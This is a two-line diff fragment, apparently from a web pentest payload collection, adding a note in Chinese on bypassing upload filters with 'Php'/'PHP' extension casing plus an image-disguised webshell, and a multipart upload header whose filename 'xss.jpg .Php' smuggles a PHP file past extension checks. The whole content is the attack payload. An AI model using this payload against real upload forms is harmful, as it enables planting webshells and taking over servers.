@@ -1,0 +1,2 @@
+Php、PHP后缀+图片马绕过
+Content-Disposition: form-data; name="up_picture"; filename="xss.jpg .Php"
